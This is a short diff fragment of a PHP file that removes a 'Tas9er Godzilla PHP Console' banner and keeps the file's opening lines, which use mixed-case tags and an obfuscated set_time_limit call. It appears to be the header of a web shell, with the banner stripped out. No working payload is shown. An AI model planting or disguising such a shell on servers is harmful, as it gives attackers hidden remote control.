@@ -1,5 +1,3 @@
-Hello Administrator!
-WelCome To Tas9er Godzilla PHP Console!
 <?pHP
 @session_start();
 @set_time_limit(Chr("48"));
